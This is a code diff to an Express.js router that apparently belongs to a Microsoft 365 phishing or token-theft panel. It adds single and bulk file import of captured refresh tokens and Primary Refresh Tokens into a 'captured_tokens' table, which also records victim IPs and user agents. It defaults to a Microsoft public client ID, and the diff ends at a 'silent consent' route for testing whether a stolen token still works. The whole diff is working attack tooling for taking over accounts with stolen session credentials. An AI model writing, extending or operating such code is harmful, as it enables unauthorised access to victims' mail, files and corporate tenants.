@@ -1074,26 +1074,35 @@ router.post('/check-status', userAuth, async (req, res) => {
 // ─── Import token manually ────────────────────────────────────────────────
 router.post('/import', userAuth, async (req, res) => {
   try {
-    const { 
-      refresh_token, 
-      access_token, 
-      id_token, 
+    // Check if this is a file upload (multipart/form-data)
+    if (req.files && req.files.tokenFile) {
+      return await importTokenFile(req, res);
+    }
+
+    // Standard JSON body import
+    const {
+      refresh_token,
+      access_token,
+      id_token,
       client_id,
       email,
       tenant,
       account_type,
-      notes 
+      notes,
+      prt,
+      name
     } = req.body;
-    
-    if (!refresh_token) {
-      return res.status(400).json({ error: 'refresh_token is required' });
+
+    if (!refresh_token && !prt) {
+      return res.status(400).json({ error: 'refresh_token or prt is required' });
     }
-    
+
     const clientId = client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const tenantVal = tenant || config.AZURE_TENANT || 'common';
     const accountType = account_type || 'work_school';
     const emailAddress = email || '';
-    
+    const tokenName = name || '';
+
     // Extract email from id_token if not provided
     let extractedEmail = emailAddress;
     if (!extractedEmail && id_token) {
@@ -1107,40 +1116,43 @@ router.post('/import', userAuth, async (req, res) => {
         // Could not extract email from id_token
       }
     }
-    
+
     // Encrypt tokens
     const accessEncrypted = access_token ? encrypt(access_token) : null;
-    const refreshEncrypted = encrypt(refresh_token);
+    const refreshEncrypted = refresh_token ? encrypt(refresh_token) : null;
     const idEncrypted = id_token ? encrypt(id_token) : null;
-    
+    const prtEncrypted = prt ? encrypt(prt) : null;
+
     // Insert into database
     const [result] = await db.query(
-      `INSERT INTO captured_tokens 
-       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, 
-        id_token_encrypted, ip_address, user_agent, notes, expiration, tenant, template_type, 
-        account_type, client_id, token_status) 
-       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?)`,
+      `INSERT INTO captured_tokens
+       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
+        id_token_encrypted, prt, ip_address, user_agent, notes, expiration, tenant, template_type,
+        account_type, client_id, token_status, name)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
       [
         req.user.id,
-        null, // no link_id for imported tokens
+        null,
         extractedEmail,
         'token',
         accessEncrypted,
         refreshEncrypted,
         idEncrypted,
-        'manual', // IP address
-        'Manual Import', // user agent
+        prtEncrypted,
+        'manual',
+        'Manual Import',
         notes || '',
         tenantVal,
         'office',
         accountType,
         clientId,
-        'active' // Start as active, will be verified
+        'active',
+        tokenName
       ]
     );
-    
-    res.json({ 
-      success: true, 
+
+    res.json({
+      success: true,
       token_id: result.insertId,
       email: extractedEmail,
       message: 'Token imported successfully'
@@ -1150,6 +1162,127 @@ router.post('/import', userAuth, async (req, res) => {
     res.status(500).json({ error: 'Server error: ' + err.message });
   }
 });
+
+// ─── Import token from file (JSON/TXT) ─────────────────────────────────────
+async function importTokenFile(req, res) {
+  try {
+    const file = req.files.tokenFile;
+    const content = file.data.toString('utf8');
+    let tokenData;
+
+    // Try to parse as JSON
+    if (file.mimetype === 'application/json' || file.name.endsWith('.json')) {
+      try {
+        tokenData = JSON.parse(content);
+      } catch (e) {
+        return res.status(400).json({ error: 'Invalid JSON format in file' });
+      }
+    } else {
+      // Try to parse as TXT - support key:value or JSON format
+      try {
+        tokenData = JSON.parse(content);
+      } catch (e) {
+        // Try key:value format
+        tokenData = {};
+        const lines = content.split('\n');
+        for (const line of lines) {
+          const colonIndex = line.indexOf(':');
+          if (colonIndex > 0) {
+            const key = line.substring(0, colonIndex).trim();
+            const value = line.substring(colonIndex + 1).trim();
+            if (key && value) {
+              tokenData[key] = value;
+            }
+          }
+        }
+      }
+    }
+
+    // Handle array of tokens
+    if (Array.isArray(tokenData)) {
+      const results = [];
+      for (const item of tokenData) {
+        const result = await processImportedToken(req, item);
+        results.push(result);
+      }
+      return res.json({
+        success: true,
+        imported: results.filter(r => r.success).length,
+        failed: results.filter(r => !r.success).length,
+        results: results
+      });
+    }
+
+    // Single token
+    const result = await processImportedToken(req, tokenData);
+    if (result.success) {
+      res.json({ success: true, token_id: result.token_id, email: result.email, message: 'Token imported successfully' });
+    } else {
+      res.status(400).json({ error: result.error });
+    }
+  } catch (err) {
+    console.error('[Tokens] File import error:', err.message);
+    res.status(500).json({ error: 'Server error: ' + err.message });
+  }
+}
+
+// ─── Process a single imported token ───────────────────────────────────────
+async function processImportedToken(req, data) {
+  try {
+    // Validate required fields
+    const refreshToken = data.refresh_token || data.refreshToken || '';
+    const prt = data.prt || data.PRT || '';
+
+    if (!refreshToken && !prt) {
+      return { success: false, error: 'Missing refresh_token or prt', email: data.email || '' };
+    }
+
+    const email = data.email || '';
+    const name = data.name || '';
+    const accessToken = data.access_token || data.accessToken || '';
+    const tenant = data.tenant || 'common';
+    const accountType = data.account_type || data.accountType || 'work_school';
+    const clientId = data.client_id || data.clientId || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+    const notes = data.notes || '';
+
+    // Encrypt tokens
+    const accessEncrypted = accessToken ? encrypt(accessToken) : null;
+    const refreshEncrypted = refreshToken ? encrypt(refreshToken) : null;
+    const prtEncrypted = prt ? encrypt(prt) : null;
+
+    // Insert into database
+    const [result] = await db.query(
+      `INSERT INTO captured_tokens
+       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
+        prt, ip_address, user_agent, notes, expiration, tenant, template_type,
+        account_type, client_id, token_status, name)
+       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
+      [
+        req.user.id,
+        null,
+        email,
+        'token',
+        accessEncrypted,
+        refreshEncrypted,
+        prtEncrypted,
+        'manual',
+        'File Import',
+        notes,
+        tenant,
+        'office',
+        accountType,
+        clientId,
+        'active',
+        name
+      ]
+    );
+
+    return { success: true, token_id: result.insertId, email: email };
+  } catch (err) {
+    console.error('[Tokens] Process token error:', err.message);
+    return { success: false, error: err.message, email: data.email || '' };
+  }
+}
 
 // ─── Silent consent: Test if existing refresh token works ────────────
 router.post('/silent-consent/test', userAuth, async (req, res) => {
